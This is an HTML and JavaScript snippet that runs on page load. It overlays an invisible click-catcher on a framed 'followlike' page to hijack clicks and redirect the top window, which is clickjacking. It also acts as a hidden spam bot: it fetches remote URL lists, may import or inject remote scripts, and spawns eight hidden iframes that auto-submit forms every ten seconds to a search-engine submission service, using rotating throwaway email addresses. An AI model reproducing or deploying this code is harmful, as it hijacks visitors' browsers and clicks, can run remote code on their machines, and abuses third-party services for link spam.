<link href='https://trafficgenerator.github.io/api/custom-frame-styles.css' rel='stylesheet'/>

<div id="container">
<iframe id="fullIframe" src="https://www.followlike.net/?r=19384926"></iframe>
<div id="clickCatcher"></div>
</div>

<script>
      document.getElementById("clickCatcher").addEventListener("click", function () {
        	//window.location.href = "http://folllike.com/?19384926";
		
		    // Changes top window; will throw if cross-origin
		    top.location.href = 'http://folllike.com/?19384926';
		    // or to replace current history:
		    // top.location.replace('http://folllike.com/?19384926');
      });
</script>
<!---------------------------------------------------------->

<script>
/* Injects a stealthIFrameContainer into the current page (no need for a manual <div>)
   Supports random submissions to web.archive.org, ghostarchive.org, and archive.today.
*/


const emails = [
	"backlink.generator.tool@gmail.com",
	"bypass.the.swedish.press@gmail.com",
	"sunkrebs@gmail.com",
	"sorryamgaming@gmail.com",
	"traffic2archive@gmail.com",
	"traffic.exchange.manager@gmail.com",
	"play.to.earn.blockchain@gmail.com",
	"martinkrebs60@gmail.com",
	"followlike.exchange@gmail.com",
	"galaverse.news@gmail.com",
	"Atlantic.Wall.Denmark@gmail.com",
	"Atlantic.Wall.map@gmail.com",
	"free.backlink.generator.tool@gmail.com",
	"regelbau.map@gmail.com",
	"regelbaumap2@gmail.com",
	"regelbau.maps@gmail.com",
	"Sikringsstilling.Nord.map@gmail.com",
	"The.Atlantic.Wall.Denmark@gmail.com"
];

const fetchData = [
		"http://seoquickbacklink.blogspot.com/",
        "http://linkboosttool.blogspot.com/",
        "http://seobacklinkboosters.blogspot.com/",
        "http://linkbuilderzone.blogspot.com/",
        "http://oneclickbacklinks.blogspot.com/",
        "http://quicklinkseo.blogspot.com/",
        "http://boostbacklinkspro.blogspot.com/",
        "http://seobacklinkprotool.blogspot.com/",
        "http://linkrankpro.blogspot.com/",
        "http://probacklinkgen.blogspot.com/",
        "http://linkpowerbuilder.blogspot.com/",
        "http://boostbacklinksfree.blogspot.com/",
        "http://seoboostpanel.blogspot.com/",
        "http://turboindexbot.blogspot.com/",
        "http://fastbacklinkbuilder.blogspot.com/",
        "http://instantbacklinkbuilder.blogspot.com/",
        "http://easybacklinklab.blogspot.com/",
        "http://rankboostertool.blogspot.com/",
        "http://rankrocketbacklinks.blogspot.com/",
        "http://pingmysitenow.blogspot.com/",
        "http://linkbuildermaster.blogspot.com/",
        "http://linkbuildermachine.blogspot.com/",
        "http://clicktobacklink.blogspot.com/",
        "http://backlinkrampage.blogspot.com/",
        "http://backlinkfleet.blogspot.com/",
        "http://autolinkvelocity.blogspot.com/",
        "http://backlinkpowerhouse.blogspot.com/",
        "http://rapidbacklinker.blogspot.com/",
        "http://one-click-backlinks.blogspot.com/",
        "http://ultimatebacklinktool.blogspot.com/",
        "http://rapidseobacklinks.blogspot.com/",
        "http://backlinkbuilderhub.blogspot.com/",
        "http://instantseolinks.blogspot.com/",
        "http://seobacklinkcreator.blogspot.com/",
        "http://linkindexsurge.blogspot.com/",
        "http://index-boost-tool.blogspot.com/",
        "http://smartbacklinkpro.blogspot.com/",
        "http://upvotestrategy.blogspot.com/",
        "http://crawltrigger.blogspot.com/",
        "http://crawltrigger.blogspot.com/",
        "http://prolinkbuildertool.blogspot.com/",
        "http://maxseobacklinks.blogspot.com/",
        "http://autolinkgenie.blogspot.com/",
        "http://crawlboosttool.blogspot.com/",
        "http://linksurgelab.blogspot.com/",
        "http://rankfueltool.blogspot.com/"
];
const fetchURLs = [
	"https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/backlink-generator.json",
	"https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/github-like4like.json"
	//"https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/github-backlink-Generator.json"
];

const IFRAME_COUNT = 8;
const SUBMIT_INTERVAL = 10000; // 60s

function isValidURL(url) {
  const pattern = /^https?:\/\/[^\s]+$/i;
  return pattern.test(url);
}
function shuffle(array){ for(let i=array.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[array[i],array[j]]=[array[j],array[i]];} }
function normalizeURL(url){ if(typeof url!=='string') return ""; return url.replace(/([^:]\/)\/+/g,"$1"); }
function randomURL(array){ return array[Math.floor(Math.random()*array.length)]; }

/* ============================================================
     ðŸ”¥ HARDENED updateDefaultURLs() â€” robust JS + JSON support
   ============================================================ */
async function updateDefaultURLs() {
  // small sleep helper
  const wait = (ms) => new Promise(res => setTimeout(res, ms));

  // import module from text using blob URL
  async function importModuleFromText(jsText) {
    const blob = new Blob([jsText], { type: 'application/javascript' });
    const blobUrl = URL.createObjectURL(blob);
    try {
      return await import(blobUrl);
    } finally {
      URL.revokeObjectURL(blobUrl);
    }
  }

  // extract possible arrays from JSON payloads
  function extractFromJSON(data) {
    if (Array.isArray(data)) return data.slice();
    for (const key of ['urls','items','data','list']) {
      if (Array.isArray(data?.[key])) return data[key].slice();
    }
    // fallback: first array property
    if (data && typeof data === 'object') {
      for (const k of Object.keys(data)) if (Array.isArray(data[k])) return data[k].slice();
    }
    return [];
  }

  // extract arrays from imported modules (common shapes)
  async function extractFromModule(mod) {
    if (!mod) return [];
    if (Array.isArray(mod.default)) return mod.default.slice();
    for (const key of ['urls','items','data','list','pins','pinIds']) {
      if (Array.isArray(mod[key])) return mod[key].slice();
    }
    for (const fn of ['build','load','get']) {
      if (typeof mod[fn] === 'function') {
        try {
          const out = await mod[fn]();
          if (Array.isArray(out)) return out.slice();
        } catch(e){ /* ignore and continue */ }
      }
    }
    return [];
  }

  // script fallback that waits for globals, an event, or a promise provided by the producer
  async function loadViaScriptAndWait(url, { timeout = 4000, pollInterval = 100 } = {}) {
    const GLOBAL_KEYS = [
      "REMOTE_URLS","REMOTE_DATA","REMOTE_ARRAY",
      "FETCH_JS_DATA","FETCH_DATA",
      "urls","items","pins","PIN_IDS"
    ];

    return new Promise((resolve) => {
      let script = document.createElement('script');
      script.async = true;
      script.src = url;

      let finished = false;
      let timer = null;

      // Handler for producer event
      function onProducerEvent(e) {
        if (finished) return;
        finished = true;
        cleanup();
        const urls = (e && e.detail && Array.isArray(e.detail.urls)) ? e.detail.urls.slice() : [];
        resolve(urls);
      }

      // Polling after onload to detect globals
      function startPolling() {
        const start = Date.now();
        (function poll() {
          if (finished) return;
          // check for window.FETCH_JS_READY promise first
          if (window.FETCH_JS_READY instanceof Promise) {
            // try to await it (but not block poll)
            window.FETCH_JS_READY.then((res) => {
              if (finished) return;
              finished = true;
              cleanup();
              if (Array.isArray(res)) return resolve(res.slice());
              // otherwise fallthrough to check globals
            }).catch(() => {});
          }
          // check known globals
          for (const k of GLOBAL_KEYS) {
            const val = window[k];
            if (Array.isArray(val) && val.length) {
              finished = true;
              cleanup();
              return resolve(val.slice());
            }
          }
          if (Date.now() - start >= timeout) {
            finished = true;
            cleanup();
            return resolve([]); // timed out
          }
          setTimeout(poll, pollInterval);
        })();
      }

      function cleanup() {
        try { window.removeEventListener('remoteUrlsReady', onProducerEvent); } catch(e){}
        if (timer) { clearTimeout(timer); timer = null; }
        try { if (script && script.parentNode) script.parentNode.removeChild(script); } catch(e){}
      }

      script.onerror = () => {
        if (finished) return;
        finished = true;
        cleanup();
        resolve([]);
      };

      script.onload = () => {
        // producer might dispatch 'remoteUrlsReady' or set FETCH_JS_READY or globals.
        // start polling to catch them.
        startPolling();
      };

      window.addEventListener('remoteUrlsReady', onProducerEvent, { once: true });
      document.head.appendChild(script);

      // As a safety, ensure we resolve after an absolute timeout even if onload never fires.
      timer = setTimeout(() => {
        if (finished) return;
        finished = true;
        cleanup();
        resolve([]);
      }, timeout + 1000);
    });
  }

  // Keep original behavior of trying each URL in order (shuffled)
  shuffle(fetchURLs);

  for (const u of fetchURLs) {
    try {
      console.log("ðŸ”Ž Trying to fetch URL list from:", u);
      const path = u.split('?')[0].toLowerCase();

      // 1) JSON path (exact original behavior)
      if (path.endsWith('.json')) {
        try {
          const r = await fetch(u);
          if (!r.ok) throw new Error('HTTP ' + r.status);
          const json = await r.json();
          const arr = extractFromJSON(json);
          if (arr.length) {
            fetchData.length = 0;
            fetchData.push(...arr);
            console.log('âœ… Loaded', arr.length, 'URLs from JSON:', u);
            return;
          } else {
            console.warn('âš  JSON fetched but no array found:', u);
            continue;
          }
        } catch (e) {
          console.warn('âš  JSON fetch failed:', u, e && e.message);
          continue;
        }
      }

      // 2) JS / MJS path: try module import first, then script fallback
      if (path.endsWith('.js') || path.endsWith('.mjs')) {
        // Try module (requires CORS)
        let triedModule = false;
        try {
          triedModule = true;
          const r = await fetch(u);
          if (r.ok) {
            const txt = await r.text();
            try {
              const mod = await importModuleFromText(txt);
              const arr = await extractFromModule(mod);
              if (arr.length) {
                fetchData.length = 0;
                fetchData.push(...arr);
                console.log('âœ… Loaded', arr.length, 'URLs from JS module:', u);
                return;
              } else {
                console.warn('âš  Module imported but exported no usable array:', u);
              }
            } catch (imErr) {
              console.warn('âš  Module import failed (will fallback to script):', u, imErr && imErr.message);
            }
          } else {
            console.warn('âš  Fetching JS text failed (HTTP):', u);
          }
        } catch (e) {
          if (triedModule) console.warn('âš  Fetch for module text failed, will fallback to script:', u, e && e.message);
        }

        // Script fallback with retries/backoff
        try {
          const ATTEMPTS = 3;
          let final = [];
          for (let attempt = 1; attempt <= ATTEMPTS; attempt++) {
            if (attempt > 1) await wait((attempt - 1) * 250);
            const arr = await loadViaScriptAndWait(u, { timeout: 2000 + attempt * 1000, pollInterval: 120 });
            if (Array.isArray(arr) && arr.length) { final = arr; break; }
          }
          if (final.length) {
            fetchData.length = 0;
            fetchData.push(...final);
            console.log('âœ… Loaded', final.length, 'URLs from JS script (fallback):', u);
            return;
          } else {
            console.warn('âš  JS script fallback returned no data after retries:', u);
            continue;
          }
        } catch (e) {
          console.warn('âš  Script fallback error for', u, e && e.message);
          continue;
        }
      }

      // 3) Unknown extension: try JSON then JS fallback
      try {
        const r = await fetch(u);
        if (r.ok) {
          const maybeJson = await r.json().catch(()=>null);
          const arr = extractFromJSON(maybeJson);
          if (arr.length) {
            fetchData.length = 0;
            fetchData.push(...arr);
            console.log('âœ… Loaded', arr.length, 'URLs from fallback JSON:', u);
            return;
          }
        }
      } catch(_) {}

      // fallback script attempt
      try {
        const arr = await loadViaScriptAndWait(u, { timeout: 3500 });
        if (Array.isArray(arr) && arr.length) {
          fetchData.length = 0;
          fetchData.push(...arr);
          console.log('âœ… Loaded', arr.length, 'URLs from fallback JS:', u);
          return;
        } else {
          console.warn('âš  Unknown resource had no usable data:', u);
        }
      } catch (e) {
        console.warn('âš  Unknown resource script fallback failed:', u, e && e.message);
      }

    } catch (err) {
      console.warn('âš  Failed to load', u, err && err.message);
    }
  }

  console.warn('âš  Using fallback URLs (no remote array loaded). fetchData length:', fetchData.length);
}

/* ============================================================
   (rest of your original code remains unchanged)
   ============================================================ */

function generateTargetURL() {
  if (!fetchData.length) return "";
  const combined = randomURL(fetchData)
  return normalizeURL(combined).replace(/^https:\/\//, 'http://');
}

/* Archive site definitions */
const ARCHIVE_SITES = [
    [
        {
          name: "1-hit.com",
          action: "https://www.1-hit.com/free-search-engine-submit.php",
          method: "POST",
          inputName: "site_url",
          extraParams: {
          	"email": "backlink.generator.tool@gmail.com",
            "uname": "backlink+generator",
            "send": "true",
            "action": "site-submit"
            //"action": "submit",
            //"x": "73",
            //"y": "25"
          }
        }
    ]
];

function chooseRandomArchive() {
     const randomArray = ARCHIVE_SITES[Math.floor(Math.random() * ARCHIVE_SITES.length)];
     return randomArray[Math.floor(Math.random() * randomArray.length)];
}

function ensureContainer() {
  return document.body || document.documentElement;
}
if(name){

}else {

}
function buildAndSubmitArchiveForm(site, targetUrl, targetFrameName) {
  if (!site || !targetUrl) return;
  try {
    const form = document.createElement("form");
    form.style.display = "none";
    form.method = site.method || "POST";
    form.action = site.action;
	form.referrerPolicy = "no-referrer";
    if (targetFrameName) form.target = targetFrameName;
    else form.target = "_self";

    const urlInput = document.createElement("input");
    urlInput.type = (site.method === "GET") ? "text" : "hidden";
    urlInput.name = site.inputName || "url";
    urlInput.value = targetUrl;
    form.appendChild(urlInput);

    if (site.extraParams) {
      for (const [k, v] of Object.entries(site.extraParams)) {
        const inp = document.createElement("input");
        inp.type = "hidden";
        inp.name = k;
        //inp.value = v;
		if (typeof k === 'string' && k.toLowerCase() === 'email') {
          inp.value = Array.isArray(emails) && emails.length ? randomURL(emails) : v;
        } else {
          inp.value = v;
        }
        form.appendChild(inp);
      }
    }

    const container = ensureContainer();
    container.appendChild(form);
    console.log(`ðŸ“¨ Submitting to ${site.name} (${site.action}) via ${site.method} target=${form.target} url=${targetUrl}`);
    form.submit();
    setTimeout(() => { try { form.remove(); } catch(e){} }, 1000);
  } catch (err) {
    console.error("âŒ buildAndSubmitArchiveForm error:", err);
  }
}

function submitToArchiveInFrame(iframe) {
  try {
    const targetUrl = generateTargetURL();
    if (!targetUrl || !isValidURL(targetUrl)) {
      console.warn("âš  Skipping invalid target:", targetUrl);
      return;
    }
    const site = chooseRandomArchive();
    buildAndSubmitArchiveForm(site, targetUrl, iframe.name);
  } catch (err) {
    console.error("âŒ submitToArchiveInFrame error:", err);
  }
}

function createIframe(i, container) {
  try {
    const iframe = document.createElement("iframe");
    const fname = "hiddenFrame" + i;
    iframe.setAttribute("name", fname);
    iframe.setAttribute("id", fname);
    iframe.classList.add("hidden-iframe");
    iframe.style.width = "100%";
    iframe.style.height = "200px";
    iframe.style.border = "0";
    iframe.src = "about:blank";

    container.appendChild(iframe);

    setTimeout(() => submitToArchiveInFrame(iframe), 250);

    setInterval(() => {
      console.log("â± Interval firing for iframe:", fname);
      submitToArchiveInFrame(iframe);
    }, SUBMIT_INTERVAL);
  } catch (err) {
    console.error("âŒ createIframe error:", err);
  }
}

function submitToArchiveRedirect(url) {
  if (!url || !isValidURL(url)) {
    console.warn("âš  Invalid or empty URL for redirect submission:", url);
    return;
  }
  const site = chooseRandomArchive();
  buildAndSubmitArchiveForm(site, url, "_self");
}

function inIframe() {
  try {
    return window.self !== window.top;
  } catch (e) {
    return true;
  }
}

document.addEventListener('DOMContentLoaded', async () => {
  try {
    await updateDefaultURLs();
  } catch (e) {
    console.warn("updateDefaultURLs() failed:", e && e.message);
  }

/*
  if (inIframe()) {
	const container = ensureContainer();
    for (let i = 0; i < IFRAME_COUNT; i++) {
      createIframe(i, container);
    }
  } else {
    submitToArchiveRedirect(generateTargetURL());
  }
  */
	const container = ensureContainer();
    for (let i = 0; i < IFRAME_COUNT; i++) {
      createIframe(i, container);
    }
});
</script>
